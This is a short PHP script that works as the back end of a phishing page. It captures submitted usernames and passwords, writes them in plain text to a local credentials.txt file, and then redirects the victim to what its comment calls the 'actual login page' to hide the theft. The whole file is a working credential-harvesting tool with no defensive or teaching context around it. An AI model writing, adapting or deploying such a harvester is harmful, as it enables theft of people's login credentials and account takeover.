<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . " Password: " . $password . "\n");
    fclose($file);
    header('Location: https://actual-login-page.com'); // Redirect to actual login page
    exit();
}
?>